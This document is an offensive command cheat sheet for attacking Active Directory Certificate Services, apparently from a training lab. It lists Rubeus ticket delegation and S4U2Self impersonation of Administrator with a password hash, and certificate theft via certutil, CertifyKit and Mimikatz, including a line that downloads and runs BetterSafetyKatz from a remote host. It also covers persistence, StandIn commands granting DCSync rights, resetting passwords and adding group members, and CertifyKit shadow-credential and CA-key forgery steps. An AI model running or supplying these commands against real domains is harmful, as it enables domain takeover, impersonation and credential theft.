# Look for AD CS containers using the AD Module

```powershell
Get-ADObject -Filter * -SearchBase '<CA authorities>'
ls 'AD:\<CA authoririty>'
```

## Based on ObjectClass

```powershell
Get-ADObject -LDAPFilter '(objectclass=certificationAuthority)' -SearchBase 'corp name' | fl *
```

## Enumerate CA

```powershell
Certify.exe cas
```

## Find Templates

```powershell
Certify.exe find
```

## CertPotato Vulnerability

### Perform tgtdeleg Attack to get a TGT

```powershell
Rubeus.exe tgtdeleg /nowrap
```

### Perform S4U2Self Attack to gain CIFS admin access

```powershell
Rubeus.exe s4u /self /impersonateuser:Administrator /altservice:cifs/cb-webapp1.certbulk.cb.corp /dc:cb-dc.certbulk.cb.corp /user:'cb-webapp1$' /rc4:B2FCBA1C3570AB9418994799B9BC985A /ptt
```

## ADCS enumeration using ADMODULE

```powershell
Import-Module C:\ADCS\Tools\ADModule\Microsoft.ActiveDirectory.Management.dll 
Import-Module C:\ADCS\Tools\ADModule\ActiveDirectory\ActiveDirectory.psd1
Get-ADDomain | ft DNSRoot, ParentDomain, InfrastructureMaster 
```

### Enumerate the Certification Authorities Container

```powershell
Get-ADObject -Filter * -SearchBase 'certificate container name'
```

ls 'AD:\CA authority container' | fl

Get-ADObject -LDAPFilter '(objectclass=certificationAuthority)' -SearchBase 'CA name' | fl * 

Use rubues for authenticating using ptt

Rubeus.exe ptt /ticket:<ticket>

### Enumerating the CertStore using CertUtil 

 certutil -store My
 certutil -user -store My

### Enumerating the CertStore using CertifyKit 

 CertifyKit.exe list
 CertifyKit.exe list /storename:my /storelocation:localmachine

### Enumerating the CertStore using PowerShell 

 Get-ChildItem Cert:\CurrentUser\ -Recurse
 Get-ChildItem Cert:\LocalMachine\ -Recurse  
 Get-ChildItem Cert:\LocalMachine\My -Recurse

### Exporting Certificates using CertUtil (THEFT1) 
 certutil -p "Passw0rd!" -exportpfx <serial number of the cert> C:\Users\Public\cert.pfx 

 ### Exporting Certificates using CertifyKit (THEFT1) 
 C:\Users\Public\CertifyKit.exe list /storename:my /storelocation:localmachine /certificate:<thumbprintofcert> /outfile:C:\Users\Public\cert_certifykit.pfx

### Exporting Certificates using Mimikatz (THEFT1) 
 C:\Users\Public\Loader.exe -path http://<ipaddress>/BetterSafetyKatz.exe -args "crypto::capi" "privilege::debug" "crypto::certificates /systemstore:local_machine /store:my /export" "exit"
 crypto::capi
 privilege::debug
 crypto::certificates /systemstore:local_machine /store:my /export 

### Exporting Certificates using PowerShell (THEFT1) 
 Export-PfxCertificate -Cert Cert:\LocalMachine\My\93B4027A4CD6A67A175E796E5DF8B673ACD2D75D -FilePath C:\Users\Public\studentadmin_psh.pfx -Password $mypwd

### Certifcate Exfiltration

Sharpshare.exe - tool for domain share enumeration

### User account persistence (PERSIST1) 
  runas /netonly /user:certbulk\<accountname> "%LocalAppData%\Microsoft\WindowsApps\wt.exe"

  Certify.exe request /ca:cb-ca.cb.corp\CB-CA /template:User /user:<accountname>

### Shadow credentials

Whisker (https://github.com/eladshamir/Whisker) aids red teams to abuse Shadow Credentials using the msDS-KeyCredentialLink attribute in red team operations.

# Perform LDAP search
StandIn.exe --ldap "(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))"
StandIn.exe --ldap servicePrincipalName=* --domain redhook --user RFludd --pass Cl4vi$Alchemi4e --limit 10
StandIn.exe --ldap servicePrincipalName=* --filter "pwdlastset, distinguishedname, lastlogon" --limit 100

# Query object properties by LDAP filter
StandIn.exe --object "(&(samAccountType=805306368)(servicePrincipalName=*vermismysteriis.redhook.local*))"
StandIn.exe --object samaccountname=Celephais-01$ --domain redhook --user RFludd --pass Cl4vi$Alchemi4e
StandIn.exe --object samaccountname=Celephais-01$ --filter "pwdlastset, serviceprincipalname, objectsid"

# Query object access permissions, optionally filter by NTAccount
StandIn.exe --object "distinguishedname=DC=redhook,DC=local" --access
StandIn.exe --object samaccountname=Rllyeh$ --access --ntaccount "REDHOOK\EDerby"
StandIn.exe --object samaccountname=JCurwen --access --domain redhook --user RFludd --pass Cl4vi$Alchemi4e

# Grant object access permissions
StandIn.exe --object "distinguishedname=DC=redhook,DC=local" --grant "REDHOOK\MBWillett" --type DCSync
StandIn.exe --object "distinguishedname=DC=redhook,DC=local" --grant "REDHOOK\MBWillett" --guid 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
StandIn.exe --object samaccountname=SomeTarget001$ --grant "REDHOOK\MBWillett" --type GenericWrite --domain redhook --user RFludd --pass Cl4vi$Alchemi4e

# Set object password
StandIn.exe --object samaccountname=SomeTarget001$ --newpass "Arkh4mW1tch!"
StandIn.exe --object samaccountname=BJenkin --newpass "Dr34m1nTh3H#u$e" --domain redhook --user RFludd --pass Cl4vi$Alchemi4e

# Add ASREP to userAccountControl flags
StandIn.exe --object samaccountname=HArmitage --asrep
StandIn.exe --object samaccountname=FMorgan --asrep --domain redhook --user RFludd --pass Cl4vi$Alchemi4e

# Remove ASREP from userAccountControl flags
StandIn.exe --object samaccountname=TMalone --asrep --remove
StandIn.exe --object samaccountname=RSuydam --asrep  --remove --domain redhook --user RFludd --pass Cl4vi$Alchemi4e

# Get a list of all ASREP roastable accounts
StandIn.exe --asrep
StandIn.exe --asrep --domain redhook --user RFludd --pass Cl4vi$Alchemi4e

# Return GPO objects, optionally wildcard filter and get ACL's
StandIn.exe --gpo --limit 20
StandIn.exe --gpo --filter admin --domain redhook --user RFludd --pass Cl4vi$Alchemi4e
StandIn.exe --gpo --filter admin --acl --domain redhook --user RFludd --pass Cl4vi$Alchemi4e

# Add samAccountName to BUILTIN\Administrators for vulnerable GPO
StandIn.exe --gpo --filter ArcanePolicy --localadmin JCurwen
StandIn.exe --gpo --filter ArcanePolicy --localadmin JCurwen --domain redhook --user RFludd --pass Cl4vi$Alchemi4e

# Add token rights to samAccountName in a vulnerable GPO
StandIn.exe --gpo --filter ArcanePolicy --setuserrights JCurwen --grant "SeTcbPrivilege,SeDebugPrivilege"
StandIn.exe --gpo --filter ArcanePolicy --setuserrights JCurwen --grant SeLoadDriverPrivilege --domain redhook --user RFludd --pass Cl4vi$Alchemi4e

# Add user/computer immediate task and optionally filter
StandIn.exe --gpo --filter ArcanePolicy --taskname LiberInvestigationis --tasktype computer --author "REDHOOK\JCurwen" --command "C:\Windows\System32\notepad.exe" --args "C:\Mysteriis\CultesDesGoules.txt"
StandIn.exe --gpo --filter ArcanePolicy --taskname LiberInvestigationis --tasktype computer --author "REDHOOK\JCurwen" --command "C:\Windows\System32\notepad.exe" --args "C:\Mysteriis\CultesDesGoules.txt" --target Rllyeh.redhook.local
StandIn.exe --gpo --filter ArcanePolicy --taskname LiberInvestigationis --tasktype user --author "REDHOOK\JCurwen" --command "C:\Windows\System32\notepad.exe" --args "C:\Mysteriis\CultesDesGoules.txt" --target "REDHOOK\RBloch" --targetsid S-1-5-21-315358687-3711474269-2098994107-1106
StandIn.exe --gpo --filter ArcanePolicy --taskname LiberInvestigationis --tasktype computer --author "REDHOOK\JCurwen" --command "C:\Windows\System32\notepad.exe" --args "C:\Mysteriis\CultesDesGoules.txt" --domain redhook --user RFludd --pass Cl4vi$Alchemi4e

# Increment either the user or computer GPO version number for the AD object
StandIn.exe --gpo --filter ArcanePolicy --increase --tasktype user
StandIn.exe --gpo --filter ArcanePolicy --increase --tasktype computer --domain redhook --user RFludd --pass Cl4vi$Alchemi4e

# Read Default Domain Policy
StandIn.exe --policy
StandIn.exe --policy --domain redhook --user RFludd --pass Cl4vi$Alchemi4e

# Perform ADIDNS searches
StandIn.exe --dns --limit 20
StandIn.exe --dns --filter SQL --limit 10
StandIn.exe --dns --forest --domain redhook --user RFludd --pass Cl4vi$Alchemi4e
StandIn.exe --dns --legacy --domain redhook --user RFludd --pass Cl4vi$Alchemi4e

# List account that have PASSWD_NOTREQD set
StandIn.exe --passnotreq
StandIn.exe --passnotreq --domain redhook --user RFludd --pass Cl4vi$Alchemi4e

# Get user and SID from either a SID or a samAccountName
StandIn.exe --sid JCurwen
StandIn.exe --sid S-1-5-21-315358687-3711474269-2098994107-1105 --domain redhook --user RFludd --pass Cl4vi$Alchemi4e

# Get a list of all kerberoastable accounts
StandIn.exe --spn
StandIn.exe --spn --domain redhook --user RFludd --pass Cl4vi$Alchemi4e

# Add/remove SPN from samAccountName
StandIn.exe --setspn RSuydam --principal MSSQL/VermisMysteriis --add
StandIn.exe --setspn RSuydam --principal MSSQL/VermisMysteriis --remove --domain redhook --user RFludd --pass Cl4vi$Alchemi4e

# List all accounts with unconstrained & constrained delegation privileges
StandIn.exe --delegation
StandIn.exe --delegation --domain redhook --user RFludd --pass Cl4vi$Alchemi4e

# Get a list of all domain controllers
StandIn.exe --dc

# List members of group or list user group membership
StandIn.exe --group Literarum
StandIn.exe --group "Magna Ultima" --domain redhook --user RFludd --pass Cl4vi$Alchemi4e
StandIn.exe --group JCurwen --domain redhook --user RFludd --pass Cl4vi$Alchemi4e

# Add user to group
StandIn.exe --group "Dunwich Council" --ntaccount "REDHOOK\WWhateley" --add
StandIn.exe --group DAgon --ntaccount "REDHOOK\RCarter" --add --domain redhook --user RFludd --pass Cl4vi$Alchemi4e

# Remove user from group
StandIn.exe --group "Dunwich Council" --ntaccount "REDHOOK\WWhateley" --remove
StandIn.exe --group DAgon --ntaccount "REDHOOK\RCarter" --remove --domain redhook --user RFludd --pass Cl4vi$Alchemi4e

# List CA's and all published templates, optionally wildcard filter on template name
StandIn.exe --adcs
StandIn.exe --adcs --filter Kingsport
StandIn.exe --adcs --domain redhook --user RFludd --pass Cl4vi$Alchemi4e

# Add/remove "Client Authentication" from template pKIExtendedKeyUsage, filter should contain the exact name of the template
StandIn.exe --adcs --filter Kingsport --clientauth --add
StandIn.exe --adcs --filter Kingsport --clientauth --remove --domain redhook --user RFludd --pass Cl4vi$Alchemi4e

# Add/remove "ENROLLEE_SUPPLIES_SUBJECT" from template msPKI-Certificate-Name-Flag, filter should contain the exact name of the template
StandIn.exe --adcs --filter Kingsport --ess --add
StandIn.exe --adcs --filter Kingsport --ess --remove --domain redhook --user RFludd --pass Cl4vi$Alchemi4e

# Add/remove "PEND_ALL_REQUESTS" from template msPKI-Enrollment-Flag, filter should contain the exact name of the template
StandIn.exe --adcs --filter Kingsport --pend --add
StandIn.exe --adcs --filter Kingsport --pend --remove --domain redhook --user RFludd --pass Cl4vi$Alchemi4e

# Change template owner, filter should contain the exact name of the template
StandIn.exe --adcs --filter Kingsport --ntaccount "REDHOOK\MBWillett" --owner
StandIn.exe --adcs --filter Kingsport --ntaccount "REDHOOK\MBWillett" --owner --domain redhook --user RFludd --pass Cl4vi$Alchemi4e

# Grant NtAccount WriteDacl/WriteOwner/WriteProperty, filter should contain the exact name of the template
StandIn.exe --adcs --filter Kingsport --ntaccount "REDHOOK\MBWillett" --write --add
StandIn.exe --adcs --filter Kingsport --ntaccount "REDHOOK\MBWillett" --write --remove  --domain redhook --user RFludd --pass Cl4vi$Alchemi4e

# Grant NtAccount "Certificate-Enrollment", filter should contain the exact name of the template
StandIn.exe --adcs --filter Kingsport --ntaccount "REDHOOK\MBWillett" --enroll --add
StandIn.exe --adcs --filter Kingsport --ntaccount "REDHOOK\MBWillett" --enroll --remove --domain redhook --user RFludd --pass Cl4vi$Alchemi4e

# Create machine object
StandIn.exe --computer Innsmouth --make
StandIn.exe --computer Innsmouth --make --domain redhook --user RFludd --pass Cl4vi$Alchemi4e

# Disable machine object
StandIn.exe --computer Arkham --disable
StandIn.exe --computer Arkham --disable --domain redhook --user RFludd --pass Cl4vi$Alchemi4e

# Delete machine object
StandIn.exe --computer Danvers --delete
StandIn.exe --computer Danvers --delete --domain redhook --user RFludd --pass Cl4vi$Alchemi4e

# Add msDS-AllowedToActOnBehalfOfOtherIdentity to machine object properties
StandIn.exe --computer Providence --sid S-1-5-21-1085031214-1563985344-725345543
StandIn.exe --computer Providence --sid S-1-5-21-1085031214-1563985344-725345543 --domain redhook --user RFludd --pass Cl4vi$Alchemi4e

# Remove msDS-AllowedToActOnBehalfOfOtherIdentity from machine object properties
StandIn.exe --computer Miskatonic --remove
StandIn.exe --computer Miskatonic --remove --domain redhook --user RFludd --pass Cl4vi$Alchemi4

## CertifyKit Commands

### Find Information About All Registered CAs

```powershell
CertifyKit.exe cas [/ca:SERVER\ca-name | /domain:domain.local | /ldapserver:server.domain.local | /path:CN=Configuration,DC=domain,DC=local] [/hideAdmins] [/showAllPermissions] [/skipWebServiceChecks] [/quiet]
```

### Find All Enabled Certificate Templates

```powershell
CertifyKit.exe find [/ca:SERVER\ca-name | /domain:domain.local | /ldapserver:server.domain.local | /path:CN=Configuration,DC=domain,DC=local] [/quiet]
```

### Find Vulnerable/Abusable Certificate Templates Using Default Low-Privileged Groups

```powershell
CertifyKit.exe find /vulnerable [/ca:SERVER\ca-name | /domain:domain.local | /ldapserver:server.domain.local | /path:CN=Configuration,DC=domain,DC=local] [/quiet]
```

### Find Vulnerable/Abusable Certificate Templates Using All Groups the Current User Context is a Part Of

```powershell
CertifyKit.exe find /vulnerable /currentuser [/ca:SERVER\ca-name | /domain:domain.local | /ldapserver:server.domain.local | /path:CN=Configuration,DC=domain,DC=local] [/quiet]
```

### Find Enabled Certificate Templates Where ENROLLEE_SUPPLIES_SUBJECT is Enabled

```powershell
CertifyKit.exe find /enrolleeSuppliesSubject [/ca:SERVER\ca-name | /domain:domain.local | /ldapserver:server.domain.local | /path:CN=Configuration,DC=domain,DC=local] [/quiet]
```

### Find Enabled Certificate Templates Capable of Client Authentication

```powershell
CertifyKit.exe find /clientauth [/ca:SERVER\ca-name | /domain:domain.local | /ldapserver:server.domain.local | /path:CN=Configuration,DC=domain,DC=local] [/quiet]
```

### Find All Enabled Certificate Templates, Display All of Their Permissions, and Don't Display the Banner Message

```powershell
CertifyKit.exe find /showAllPermissions /quiet [/ca:COMPUTER\CA_NAME | /domain:domain.local | /ldapserver:server.domain.local | /path:CN=Configuration,DC=domain,DC=local]
```

### Find All Enabled Certificate Templates and Output to a JSON File

```powershell
CertifyKit.exe find /json /log:C:\temp\out.json [/ca:COMPUTER\CA_NAME | /domain:domain.local | /ldapserver:server.domain.local | /path:CN=Configuration,DC=domain,DC=local]
```

### Enumerate Access Control Information for PKI Objects

```powershell
CertifyKit.exe pkiobjects [/domain:domain.local | /ldapserver:server.domain.local] [/showAdmins] [/quiet]
```

### Request a New Certificate Using the Current User Context

```powershell
CertifyKit.exe request /ca:SERVER\ca-name [/subject:X] [/template:Y] [/install]
```

### Request a New Certificate Using the Current Machine Context

```powershell
CertifyKit.exe request /ca:SERVER\ca-name /machine [/subject:X] [/template:Y] [/install]
```

### Request a New Certificate Using the Current User Context but for an Alternate Name (if Supported)

```powershell
CertifyKit.exe request /ca:SERVER\ca-name /template:Y /altname:USER
```

### Request a New Certificate on Behalf of Another User, Using an Enrollment Agent Certificate

```powershell
CertifyKit.exe request /ca:SERVER\ca-name /template:Y /onbehalfof:DOMAIN\USER /enrollcert:C:\temp\enroll.pfx [/enrollcertpw:CERT_PASSWORD]
```

### Alter the Template to Smart Card Template and Request a New Certificate for an Alternate Name and Restore the Template to Original State

```powershell
CertifyKit.exe request /ca:SERVER\ca-name /template:Y /alter /altname:USER
```

### Download an Already Requested Certificate

```powershell
CertifyKit.exe download /ca:SERVER\ca-name /id:ID [/install] [/machine]
```

### Issue a Pending or Deleted Certificate

```powershell
CertifyKit.exe download /ca:SERVER\ca-name /issue /id:ID
```

### List All Certificates in Store My, CurrentUser by Default or in a Folder Recursively

```powershell
CertifyKit.exe list [/storename:X | /storelocation:Y | /certificate:C:\Users\] [/password:CERT_PASSWORD] [/recurse]
```

### Read a Certificate Specifying Thumbprint or File or Base64 String with Password and Export as File or Base64 String with a Password

```powershell
CertifyKit.exe list /certificate:THUMBPRINT/FILE/BASE64 [/outfile:exportfile.pfx | /base64] /password:CERT_PASSWORD /encpass:ENC_PASSWORD
```

### Import a Certificate from File or Base64 String with Password to Store My, CurrentUser by Default

```powershell
CertifyKit.exe list /certificate:FILE/BASE64 [/outfile:exportfile.pfx | /base64] /password:CERT_PASSWORD [/storename:X | /storelocation:Y]
```

### Build Chain of a Certificate from Store My, CurrentUser by Default Specifying Thumbprint

```powershell
CertifyKit.exe list /certificate:THUMBPRINT [/storename:X | /storelocation:Y] /chain
```

### Remove a Certificate from Store My, CurrentUser by Default Specifying Thumbprint

```powershell
CertifyKit.exe list /certificate:THUMBPRINT /remove [/storename:X | /storelocation:Y]
```

### Backup Private Key for a Certificate Authority's CA Certificate on CA Server, Which Could Be Used to Forge AD CS Certificate

```powershell
CertifyKit list /golden [/outfile:C:\backup.pfx | /base64] [/encpass:ENC_PASSWORD]
```

### Create or Remove a Machine Account

```powershell
CertifyKit account /machine:MACHINE [/createpc | /removepc] [/domain:domain.local | /ldapserver:server.domain.local]
```

### Alter dNSHostName of a Machine Account or Alter userPrincipalName of a User/Machine Account or Clear userPrincipalName of a User Account

```powershell
CertifyKit account [/machine:MACHINE | /user:USER] [/dns:new.domain.local | /upn:new@domain.local] [clear]
```

### Alter or Query Attribute of an Account

```powershell
CertifyKit account [/machine:MACHINE | /user:USER] /attribute:ATTRIBUTE [/query | /value:VALUE | /clear | /remove:ID] [/append]
```

### Shadow Credential Attack on a Machine Account and Output Self Signed Certificate as Base64 String by Default

```powershell
CertifyKit account /machine:MACHINE /shadow [/outfile:C:\xxx.pfx | /install] [/encpass:ENC_PASSWORD]
```

### Query or Remove or Clear KeyCredentialLink on a User Account

```powershell
CertifyKit account /user:USER /shadow [/list | /remove:ID | /clear]
```

### Map a Certificate to a Machine Account for the Purpose of Authentication

```powershell
CertifyKit account /machine:MACHINE /altsecid /certificate:THUMBPRINT/FILE/BASE64 [/password:CERT_PASSWORD]
```

### Query or Remove or Clear altSecurityIdentities on a User Account

```powershell
CertifyKit account /user:USER /altsecid [/list | /remove:ID | /clear]
```